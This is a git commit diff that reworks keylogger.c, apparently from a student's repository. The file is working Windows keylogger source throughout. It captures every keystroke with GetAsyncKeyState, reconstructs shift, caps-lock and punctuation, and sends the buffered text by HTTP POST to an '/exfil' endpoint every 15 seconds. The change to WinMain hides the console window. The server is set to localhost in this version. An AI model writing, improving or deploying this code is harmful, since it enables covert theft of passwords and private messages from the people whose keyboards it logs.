c96af1677b98887665423bc474962c428467ed16
jacobaustin1 <jda3203@rit.edu>
2025-09-23 22:08:37 -0400

    Update keylogger.c
    reworked functionality

--- keylogger.c
+++ keylogger.c
@@ -1,20 +1,23 @@
+#define _CRT_SECURE_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#include <winsock2.h>
+#include <windows.h>
 #include <stdio.h>
 #include <string.h>
-#include <windows.h>
-#include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
 
-#define SERVER "your.server.ip" // Use IP or plain domain (no https)
+#define SERVER "127.0.0.1"
 #define PORT 80
 #define LOG_BUFFER_SIZE 1024
 
-void exfiltrate_data(const char *data) {
+void exfiltrate_data(const char* data) {
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
     char message[2048], response[4096];
+    int result;
 
-    // Compose HTTP POST
     sprintf(message,
         "POST /exfil HTTP/1.1\r\n"
         "Host: %s\r\n"
@@ -23,55 +26,96 @@ void exfiltrate_data(const char *data) {
         "data=%s",
         SERVER, (int)(strlen(data) + 5), data);
 
-    WSAStartup(MAKEWORD(2,2), &wsa);
+    result = WSAStartup(MAKEWORD(2, 2), &wsa);
+    if (result != 0) return;
     s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s == INVALID_SOCKET) {
+        WSACleanup();
+        return;
+    }
 
     server.sin_addr.s_addr = inet_addr(SERVER);
     server.sin_family = AF_INET;
     server.sin_port = htons(PORT);
 
-    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0) {
-        send(s, message, (int)strlen(message), 0);
-        recv(s, response, sizeof(response), 0);
+    result = connect(s, (struct sockaddr*)&server, sizeof(server));
+    if (result != 0) {
+        closesocket(s);
+        WSACleanup();
+        return;
     }
+
+    send(s, message, (int)strlen(message), 0);
+    recv(s, response, sizeof(response), 0);
+
     closesocket(s);
     WSACleanup();
 }
 
-int main(void) {
-    char log_buffer[LOG_BUFFER_SIZE] = {0};
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    char log_buffer[LOG_BUFFER_SIZE] = { 0 };
     int log_index = 0;
-    char key;
-    DWORD last_exfil = GetTickCount();
+    int key;
+    ULONGLONG last_exfil = GetTickCount64();
+
+    SHORT shift_pressed, caps_lock;
 
     while (1) {
         for (key = 8; key <= 222; key++) {
             if (GetAsyncKeyState(key) == -32767) {
-                // Alphanumeric and some punctuation
-                if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90) || (key >= 97 && key <= 122)) {
-                    log_buffer[log_index++] = key;
-                } else if (key == VK_SPACE) {
+                shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+                // Backspace support
+                if (key == VK_BACK) {
+                    if (log_index > 0) {
+                        log_index--;
+                        log_buffer[log_index] = '\0';
+                    }
+                    continue;
+                }
+                // Space and Enter
+                if (key == VK_SPACE) {
                     log_buffer[log_index++] = ' ';
-                } else if (key == VK_RETURN) {
+                }
+                else if (key == VK_RETURN) {
                     log_buffer[log_index++] = '\n';
                 }
-                // If buffer is nearly full, exfiltrate
+                // Letters
+                else if (key >= 65 && key <= 90) {
+                    int upper = 0;
+                    if (caps_lock ^ shift_pressed) upper = 1;
+                    log_buffer[log_index++] = upper ? key : key + 32;
+                }
+                // Numbers/punctuation
+                else if ((key >= 48 && key <= 57) || (key >= 186 && key <= 222)) {
+                    BYTE keyboard_state[256];
+                    WORD unicode[2];
+                    int r;
+                    if (GetKeyboardState(keyboard_state)) {
+                        r = ToAscii(key, 0, keyboard_state, unicode, 0);
+                        if (r == 1 && log_index < LOG_BUFFER_SIZE - 1) {
+                            log_buffer[log_index++] = (char)unicode[0];
+                        }
+                    }
+                }
+                // Exfiltrate if buffer is nearly full
                 if (log_index >= LOG_BUFFER_SIZE - 2) {
                     log_buffer[log_index] = '\0';
                     exfiltrate_data(log_buffer);
                     log_index = 0;
                     memset(log_buffer, 0, LOG_BUFFER_SIZE);
-                    last_exfil = GetTickCount();
+                    last_exfil = GetTickCount64();
                 }
             }
         }
         // Exfiltrate every 15 seconds even if buffer isn't full
-        if (log_index > 0 && (GetTickCount() - last_exfil > 15000)) {
+        if (log_index > 0 && (GetTickCount64() - last_exfil > 15000)) {
             log_buffer[log_index] = '\0';
             exfiltrate_data(log_buffer);
             log_index = 0;
             memset(log_buffer, 0, LOG_BUFFER_SIZE);
-            last_exfil = GetTickCount();
+            last_exfil = GetTickCount64();
         }
         Sleep(10);
     }
